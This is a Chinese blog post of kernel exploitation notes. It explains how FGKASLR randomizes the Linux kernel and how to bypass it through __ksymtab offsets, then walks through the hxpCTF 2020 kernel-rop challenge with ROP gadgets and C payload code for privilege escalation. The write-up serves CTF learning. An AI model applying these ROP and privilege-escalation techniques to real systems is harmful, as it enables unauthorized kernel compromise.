@@ -1,0 +1,768 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/hope.jpg">
+  <link rel="icon" href="/img/hope.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="hope">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="kernel-pwn学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kernel-Pwn-FGKASLR">
+<meta property="og:url" content="https://h0pe-ay.github.io/undefined/Kernel-Pwn-FGKASLR/index.html">
+<meta property="og:site_name" content="hope">
+<meta property="og:description" content="kernel-pwn学习笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150483.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150484.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150485.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150486.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150487.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150488.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150489.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150490.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150491.png">
+<meta property="article:published_time" content="2023-07-03T13:49:29.170Z">
+<meta property="article:modified_time" content="2023-07-03T13:52:11.141Z">
+<meta property="article:author" content="hope">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150483.png">
+  
+  
+  
+  <title>Kernel-Pwn-FGKASLR - hope</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"h0pe-ay.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ZqEEnP8vrF2LzEKjCt8pL5Cf-gzGzoHsz","app_key":"6Owvec9nVB4K93xxi7CKzAqh","server_url":"https://zqeenp8v.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>hope</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Kernel-Pwn-FGKASLR"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-03 21:49" pubdate>
+          2023年7月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          111 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Kernel-Pwn-FGKASLR</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="FGKASLR"><a href="#FGKASLR" class="headerlink" title="FGKASLR"></a>FGKASLR</h1><p>FGASLR（Function Granular KASLR）是KASLR的加强版，增加了更细粒度的地址随机化。因此在开启了FGASLR的内核中，即使泄露了内核的程序基地址也不能调用任意的内核函数。</p>
+<h2 id="layout-randomized-image"><a href="#layout-randomized-image" class="headerlink" title="layout_randomized_image"></a>layout_randomized_image</h2><p>在<a target="_blank" rel="noopener" href="https://github.com/kaccardi/linux/blob/fg-kaslr/arch/x86/boot/compressed/fgkaslr.c">fgkaslr.c</a>文件中存在着随机化的明细。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">	linux/arch/x86/boot/compressed/fgkaslr.c</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">layout_randomized_image</span><span class="hljs-params">(<span class="hljs-type">void</span> *output, Elf64_Ehdr *ehdr, Elf64_Phdr *phdrs)</span><br>&#123;<br>    ...<br>	shnum = ehdr-&gt;e_shnum; <span class="hljs-comment">//获取节区的数量</span><br>	shstrndx = ehdr-&gt;e_shstrndx; <span class="hljs-comment">//获取字符串的索引</span><br>    ...<br>	<span class="hljs-comment">/* we are going to need to allocate space for the section headers */</span><br>	sechdrs = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(*sechdrs) * shnum); <span class="hljs-comment">//开辟一段空间用于防止节区头部</span><br>	<span class="hljs-keyword">if</span> (!sechdrs)<br>		error(<span class="hljs-string">&quot;Failed to allocate space for shdrs&quot;</span>);<br><br>	sections = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(*sections) * shnum); <span class="hljs-comment">//开辟一段空间用户防止节区的内容</span><br>	<span class="hljs-keyword">if</span> (!sections)<br>		error(<span class="hljs-string">&quot;Failed to allocate space for section pointers&quot;</span>);<br><br>	<span class="hljs-built_in">memcpy</span>(sechdrs, output + ehdr-&gt;e_shoff,<br>	       <span class="hljs-keyword">sizeof</span>(*sechdrs) * shnum); <span class="hljs-comment">//拷贝头部数据</span><br><br>	<span class="hljs-comment">/* we need to allocate space for the section string table */</span><br>	s = &amp;sechdrs[shstrndx]; <span class="hljs-comment">//获取节区名</span><br><br>	secstrings = <span class="hljs-built_in">malloc</span>(s-&gt;sh_size); <span class="hljs-comment">//开辟一段空间用于防止节区名称</span><br>	<span class="hljs-keyword">if</span> (!secstrings)<br>		error(<span class="hljs-string">&quot;Failed to allocate space for shstr&quot;</span>);<br><br>	<span class="hljs-built_in">memcpy</span>(secstrings, output + s-&gt;sh_offset, s-&gt;sh_size); <span class="hljs-comment">//拷贝节区名称</span><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * now we need to walk through the section headers and collect the</span><br><span class="hljs-comment">	 * sizes of the .text sections to be randomized.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; shnum; i++) &#123; <span class="hljs-comment">//遍历节区，选择需要重定位的节区</span><br>		s = &amp;sechdrs[i];<br>		sname = secstrings + s-&gt;sh_name;<br><br>		<span class="hljs-keyword">if</span> (s-&gt;sh_type == SHT_SYMTAB) &#123; <span class="hljs-comment">//遇到符号节区跳过</span><br>			<span class="hljs-comment">/* only one symtab per image */</span><br>			<span class="hljs-keyword">if</span> (symtab)<br>				error(<span class="hljs-string">&quot;Unexpected duplicate symtab&quot;</span>);<br><br>			symtab = <span class="hljs-built_in">malloc</span>(s-&gt;sh_size);<br>			<span class="hljs-keyword">if</span> (!symtab)<br>				error(<span class="hljs-string">&quot;Failed to allocate space for symtab&quot;</span>);<br><br>			<span class="hljs-built_in">memcpy</span>(symtab, output + s-&gt;sh_offset, s-&gt;sh_size);<br>			num_syms = s-&gt;sh_size / <span class="hljs-keyword">sizeof</span>(*symtab);<br>			<span class="hljs-keyword">continue</span>;<br>		&#125;<br>        ...<br>		<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(sname, <span class="hljs-string">&quot;.text&quot;</span>)) &#123; <span class="hljs-comment">//第一个.text的节区直接跳过</span><br>			<span class="hljs-keyword">if</span> (text)<br>				error(<span class="hljs-string">&quot;Unexpected duplicate .text section&quot;</span>);<br>			text = s;<br>			<span class="hljs-keyword">continue</span>;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(sname, <span class="hljs-string">&quot;.data..percpu&quot;</span>)) &#123; <span class="hljs-comment">//遇到.data..precpu的节区也直接跳过</span><br>			<span class="hljs-comment">/* get start addr for later */</span><br>			percpu = s;<br>			<span class="hljs-keyword">continue</span>;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!(s-&gt;sh_flags &amp; SHF_ALLOC) ||<br>		    !(s-&gt;sh_flags &amp; SHF_EXECINSTR) ||<br>		    !(strstarts(sname, <span class="hljs-string">&quot;.text&quot;</span>))) <span class="hljs-comment">//若一个节区具有SHF_ALLOC与SHF_EXECINSTR的标志位，并且节区名的前缀属于.text则会进行细粒度的地址随机化</span><br>			<span class="hljs-keyword">continue</span>;<br><br>		sections[num_sections] = s; <span class="hljs-comment">//剩余的节区都放置到新开辟的空间中，进行细粒度的地址随机化</span><br>		num_sections++;<br>	&#125;<br>	sections[num_sections] = <span class="hljs-literal">NULL</span>;<br>	sections_size = num_sections;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过上述代码分析可知</p>
+<ul>
+<li><p>符号节区不进行细粒度的地址随机化</p>
+</li>
+<li><p>第一个<code>.text</code>节是不会进行细粒度的地址随机化</p>
+</li>
+<li><p>需要同时具备<code>SHF_ALLOC</code>与<code>SHF_EXECINSTR</code>标志位，并且节区的前缀为<code>.text</code>才会被选择进行细粒度的地址随机化</p>
+</li>
+</ul>
+<p>可以看到<code>layout_randomized_image</code>函数还是会保持原有的节区偏移，但是会在内存中寻找另一个空间进行存储，这就导致在内核开启了FGKASLR保护时并不是所有的节区都以内核程序基地址作为基址进行偏移，想要做到任意内核函数的调用，就需要找到调用函数所处的节区的基地址，使得利用更加复杂化了。</p>
+<h2 id="FGKASLR保护的绕过"><a href="#FGKASLR保护的绕过" class="headerlink" title="FGKASLR保护的绕过"></a>FGKASLR保护的绕过</h2><p>想要绕过FGKASLR，我们可以挑选不受影响的节区中的<code>gadget</code>进行<code>ROP</code>链的构造。</p>
+<p>首先是不存在<code>SHF_ALLOC</code>与<code>SHF_EXECINSTR</code>标志位的节区</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150483.png" srcset="/img/loading.gif" lazyload alt="image-20230703202123018"></p>
+<p>其次是<code>.text</code>的节区，可以看到该节区存在<code>0x200000</code>的大小，因此可以挑选<code>0xffffffff81000000 - 0xffffffff81000000 + 0x200000</code>，可选的<code>gadget</code>还是比较充足的。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150484.png" srcset="/img/loading.gif" lazyload alt="image-20230703202341608"></p>
+<p>上述的节区都是不受FGKASLR保护的影响，只需要泄露出内核程序的基地址，就可以按照绕过KASLR的思路进行漏洞的利用。</p>
+<p>想要在内核态完成提权返回到用户态，我们需要调用<code>commit_creds(prepare_kernel_cred(0)) -&gt; swapgs -&gt; iretq</code></p>
+<p>因此先来看<code>commit_creds</code>与<code>prepare_kernel_cred</code>函数是否符合要求，可以看到<code>commit_creds</code>函数的地址为<code>0xffffffff814c6410</code>，<code>prepare_kernel_cred</code>函数的地址为<code>0xffffffff814c67f0</code>都是超过<code>.text</code>的节区空间了（这里我是关闭了KASLR的）。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150485.png" srcset="/img/loading.gif" lazyload alt="image-20230703203853456"></p>
+<p>可以多运行几次环境，查看这个两个函数的地址，会发现末尾地址的偏移会一直在变化。(开启了KASLR)</p>
+<p><code>cat /proc/kallsyms | grep -E &quot;commit_creds|prepare_kernel_cred&quot;</code></p>
+<p><strong>第一次</strong></p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150486.png" srcset="/img/loading.gif" lazyload alt="image-20230703204358552"></p>
+<p><strong>第二次</strong></p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150487.png" srcset="/img/loading.gif" lazyload alt="image-20230703204436120"></p>
+<p>可以看到第一次运行与第二次运行的地址是完全不一样的，但是处于不进行细粒度的节区<code>ksymtab</code>，只有中间的九个比特位（KASLR）发生了改变，其余部分是一致的。这也是<code>KASLR</code>与<code>FGKASLR</code>的区别。但是实际的利用又需要用到这两个函数，因此还是需要特殊的手法泄露出这两个函数的实际地址。（1）能够泄露这两个函数现有的基地址（2）通过符号表进行地址读取。</p>
+<p>这里采用（2）的手法进行函数地址的泄露，<code>ksymtab</code>节存放着内核函数的符号表，使用下述结构体进行维护。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel_symbol</span> &#123;</span><br>	  <span class="hljs-type">int</span> value_offset;<br>	  <span class="hljs-type">int</span> name_offset;<br>	  <span class="hljs-type">int</span> namespace_offset;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>value_offset</code>：内核符号的值的偏移</li>
+<li><code>name_offset</code>：内核符号的名称的偏移</li>
+<li><code>namespace_offset</code>：内核符号所属的命名空间的名称在内存中的偏移量或地址。</li>
+</ul>
+<p>因此<code>value_offset</code>正是我们所关注的，这里需要注意的是这里的偏移地址是基于当前地址的偏移。以<code>ksymtab_commit_creds</code>为例，<code>ksymtab_commit_creds</code>的地址值为<code>0xffffffffa8587d90</code>，该地址存储的值为<code>0xffa17ef0</code>，计算的结果为<code>0xffffffffa8587d90- (2^32 - 0xffa17ef0) = 0xffffffffa7f9fc80</code> ，结果刚好是<code>commit_creds</code>函数的地址值，这里说明一下为什么需要用<code>(2^32 - 0xffa17ef0)</code>，因为<code>value_offset</code>是<code>int</code>类型，而<code>0xffa17ef0</code>是负数，因此需要先转换在进行相减才是实际值。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150488.png" srcset="/img/loading.gif" lazyload alt="image-20230703210116622"></p>
+<p>那么利用上述的方法就可以求出<code>commit_creds</code>与<code>prepare_kernel_cred</code>函数的地址。</p>
+<p>那么接着看如何获取<code>swapgs</code>与<code>iretq</code>指令的地址，之前在介绍如何绕过<code>kpti</code>时介绍过一个特殊的函数<code>swapgs_restore_regs_and_return_to_usermode</code>，里面除了能够通过<code>cr3</code>转换页表，里面还具备<code>swapgs</code>和<code>iretq</code>指令。在内核中搜索一下这个函数的地址，可以发现它处于<code>.text</code>节区的范围内，因此这个地址可以直接拿来用。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150489.png" srcset="/img/loading.gif" lazyload alt="image-20230703210936389"></p>
+<p>因此绕过<code>FGKASLR</code>的方法就出来了，首先是泄露内核程序基地址，通过该基地址获得<code>__ksymtab_commit_creds</code>与<code>__ksymtab_prepare_kernel_cred</code>的地址，通过上述两个符号获取实际的<code>commit_creds</code>与<code>prepare_kernel_cred</code>函数的地址，最后通过<code>swapgs_restore_regs_and_return_to_usermode</code>函数返回用户态。</p>
+<h1 id="hxpCTF-2020-kernel-rop"><a href="#hxpCTF-2020-kernel-rop" class="headerlink" title="hxpCTF 2020 kernel-rop"></a>hxpCTF 2020 kernel-rop</h1><h2 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">qemu-system-x86_64 \<br>    -m <span class="hljs-number">128</span>M \<br>    -cpu kvm64,+smep,+smap \<br>    -kernel vmlinuz \<br>    -initrd initramfs.cpio.gz \<br>    -hdb flag.txt \<br>    -snapshot \<br>    -nographic \<br>    -monitor /dev/null \<br>    -no-reboot \<br>    -append <span class="hljs-string">&quot;console=ttyS0  kaslr kpti=1  quiet panic=1&quot;</span> \<br>    -s<br></code></pre></td></tr></table></figure>
+
+<p>这里还是使用 hxpCTF 2020的内核题作为例子</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/h0pe-ay/Kernel-Pwn">https://github.com/h0pe-ay/Kernel-Pwn</a></p>
+<p>之前提到过了程序存在栈溢出的漏洞，并且允许我们读取内核栈上的数据，通过读取内核栈上的数据可以泄露出<code>canary</code>的值以及程序的基地址，这里需要特别注意的是，当开启了<code>FGKASLR</code>时，不是所有的地址都可以用来计算基地址的，只能找在<code>.text</code>范围内的地址，否则是无法计算出内核程序基地址。因此这里选择<code>0xffffffff8100a157</code>的地址作为泄露地址。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150490.png" srcset="/img/loading.gif" lazyload alt="image-20230703211839527"></p>
+<p>那么在泄露了<code>canary</code>和地址之后就可以利用栈溢出完成提权返回用户态了，在之前的用户态下的利用，我们可以借助<code>write</code>或者是<code>puts	</code>函数去读取地址中的内容，但是在内核态的利用则不需要这么麻烦了，例如可以先将<code>__ksymtab_commit_creds</code>地址赋值给<code>rax</code>寄存器，接着通过<code>mov rax，[rax]; ret</code>的指令完成对指定地址完成读取操作。这里我使用的<code>gadget</code>为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xffffffff81004d11</span>: pop rax; ret; [<span class="hljs-number">0x4d11</span>]<br><span class="hljs-number">0xffffffff81015a7f</span>: mov rax, qword ptr [rax]; pop rbp; ret; [<span class="hljs-number">0x15a7f</span>]<br></code></pre></td></tr></table></figure>
+
+<p>首先利用<code>pop rax; ret</code>指令，将<code>__ksymtab_commit_creds</code>函数的地址赋值给<code>rax</code>寄存器，接着使用<code>mov rax, qword ptr [rax];</code>函数将<code>__ksymtab_commit_creds</code>地址的内容读取到<code>rax</code>寄存器中，那么接下来就是如何提取出<code>rax</code>寄存器。可以借助<code>swapgs_restore_regs_and_return_to_usermode</code>函数先暂时返回到用户态，接着采用内联汇编，进行值的提取。<strong>这里需要注意的是需要将<code>ROP</code>链与内联汇编分隔开，否则<code>rax</code>寄存器可能会被编译器优化掉，即会有清空<code>rax</code>寄存器的操作</strong>。并且所有找的<code>gadget</code>都必须是不会进行细粒度调整的节区中挑选，否则无法获取真实地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br><span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>		payload[index++] = <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br>	payload[index++] = canary;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = image_base +  <span class="hljs-number">0x4d11</span>; <span class="hljs-comment">//pop_rax_ret</span><br>	payload[index++] = image_base + <span class="hljs-number">0xf87d90</span>; <span class="hljs-comment">//__ksymtab_commit_creds</span><br>	payload[index++] = image_base + <span class="hljs-number">0x15a7f</span>; <span class="hljs-comment">// mov rax, qword ptr [rax]; pop rbp; ret;</span><br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = image_base + <span class="hljs-number">0x200f10</span> + <span class="hljs-number">22</span>; <span class="hljs-comment">//swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;</span><br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)leak_commit_creds;<br>	payload[index++] = user_cs;<br>	payload[index++] = user_rflags;<br>	payload[index++] = user_sp;<br>	payload[index++] = user_ss;<br>	write(fd, payload, index * <span class="hljs-number">8</span>);<br>	<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak_commit_creds</span><span class="hljs-params">()</span><br>&#123;<br>	__asm(<br>		<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>		<span class="hljs-string">&quot;mov commit_creds_offset, eax;&quot;</span><br>		<span class="hljs-string">&quot;.att_syntax;&quot;</span><br>	);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;commit_cred_offset:0x%x\n&quot;</span>, commit_creds_offset);<br>	commit_creds = image_base + <span class="hljs-number">0xf87d90</span> + (<span class="hljs-type">int</span>)commit_creds_offset;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;commit_cred:0x%lx\n&quot;</span>, commit_creds);<br>	jmp_leak_prepare_kernel_cred();<br>&#125;<br>...<br></code></pre></td></tr></table></figure>
+
+<p>在调用为<code>prepare_kernel_cred</code>后需要将<code>rax</code>寄存器的值传递给<code>rdi</code>寄存器中，因为需要作为<code>commit_creds</code>函数的参数。但是在<code>.text</code>中找了很久都没有合适的<code>gadget</code>，那么还是同样采用内联汇编，将<code>rax</code>寄存器的值读取出，再传递给<code>commit_creds</code>函数即可。<strong>这里又需要特别注意，最好不要使用太多的全局变量存储，否则会覆盖一开始保存的user_cs，user_rflags，user_sp，user_ss的变量值。</strong>因此在<code>payload</code>中我特定将这几个变量初始化的特定的值，使得这几个变量存储在<code>.data</code>段防止被其它的值覆盖。</p>
